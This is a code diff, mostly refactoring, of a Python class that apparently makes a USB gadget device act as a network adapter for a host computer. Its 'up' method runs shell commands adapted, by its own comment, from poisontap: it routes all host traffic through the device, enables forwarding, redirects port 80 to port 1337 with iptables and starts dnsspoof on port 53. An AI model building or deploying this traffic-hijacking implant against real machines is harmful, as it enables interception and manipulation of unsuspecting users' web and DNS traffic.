@@ -1,6 +1,6 @@
 import subprocess
 
-from framework.FwComponentGadget import FwComponentGadget
+from components.framework.FwComponentGadget import FwComponentGadget
 
 
 class FwComponentNetwork(FwComponentGadget):
@@ -30,13 +30,12 @@ class FwComponentNetwork(FwComponentGadget):
     # Constructor
     def __init__(self, enabled=False, debug=True, state="uninitialised"):
         super().__init__(driver_name="g_ether", enabled=enabled, vendor_id="0x04b3", product_id="0x4010", debug=debug)
-        self.debug = debug
         self.state = state
         self.ping_address = "8.8.8.8"
 
     # Destructor
     def __del__(self):
-        self.disable()  # Disable eth driver
+        super().disable()  # Disable eth driver
 
     # Check for internet connectivity
     def test_internet(self):
@@ -69,13 +68,17 @@ class FwComponentNetwork(FwComponentGadget):
         #  subprocess.call(["./shell_scripts/usb_net_up.sh"])  # Run shell script to enable DHCP server and spoof ports
         super().debug(subprocess.call("ifup usb0", shell=True))  # Up usb0 interface
         super().debug(subprocess.call("ifconfig usb0 up", shell=True))  # Up networking on usb0
-        super().debug(subprocess.call("/bin/route add -net 0.0.0.0/0 usb0", shell=True))  # Add route for all IPv4 addresses
+        super().debug(
+            subprocess.call("/bin/route add -net 0.0.0.0/0 usb0", shell=True))  # Add route for all IPv4 addresses
         super().debug(subprocess.call("/etc/init.d/isc-dhcp-server", shell=True))  # Start DHCP server
 
         # Does things (stolen from poisontap)
         super().debug(subprocess.call("/sbin/sysctl -w net.ipv4.ip_forward=1", shell=True))  # No idea what this does
-        super().debug(subprocess.call("/sbin/iptables -t nat -A PREROUTING -i usb0 -p tcp --dport 80 -j REDIRECT --to-port 1337", shell=True))  # Bind port 80 to port 1337
-        super().debug(subprocess.call("/usr/bin/screen -dmS dnsspoof /usr/sbin/dnsspoof -i usb0 port 53", shell=True))  # Start dnsspoof on port 53
+        super().debug(
+            subprocess.call("/sbin/iptables -t nat -A PREROUTING -i usb0 -p tcp --dport 80 -j REDIRECT --to-port 1337",
+                            shell=True))  # Bind port 80 to port 1337
+        super().debug(subprocess.call("/usr/bin/screen -dmS dnsspoof /usr/sbin/dnsspoof -i usb0 port 53",
+                                      shell=True))  # Start dnsspoof on port 53
         self.state = "usb0 up"
         if self.debug:  # Debug text
             super().debug(self.state)
@@ -88,9 +91,7 @@ class FwComponentNetwork(FwComponentGadget):
         super().debug(subprocess.call("ifconfig usb0 down", shell=True))
         super().debug(subprocess.call("ifdown usb0", shell=True))
         self.state = "usb0 down"
-        if self.debug:  # Debug text
-            super().debug(self.state)
-        return
+        super().debug(self.state)
 
     # Removing USB Ethernet
     def disable(self):
@@ -108,9 +109,3 @@ class FwComponentNetwork(FwComponentGadget):
 # TODO #1 network over USB handler
 # TODO #2 offline connection status check (must be able to test for physical connection not just internet)
 # TODO #3 Read through PiKey, poisontap Source, do some general g_ether research - see what others are using it for
-
-
-# For testing
-if __name__ == "__main__":
-    test = FwComponentNetwork()
-    test.test_local()
